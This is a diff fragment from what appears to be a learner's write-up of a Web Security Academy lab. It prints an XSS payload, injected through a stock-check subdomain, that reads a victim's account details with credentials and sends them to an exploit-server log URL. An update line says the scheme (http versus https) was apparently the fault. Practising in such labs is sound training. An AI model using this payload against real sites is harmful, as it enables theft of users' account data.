@@ -119,3 +119,5 @@ For some reason my solution do not work. Tests in my browser were successfull, b
     document.location="http://stock.0aca0019034db25a82e62aed000c00f6.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0aca0019034db25a82e62aed000c00f6.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a27009303c9b21f82892917011a009d.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
 ```
+
+(Update: comparing the solutions, the schema was different: `https` instead of `http`, but because the lab was already solved I had problems testing whether this will fix this - the victim did no longer react to sending him links)
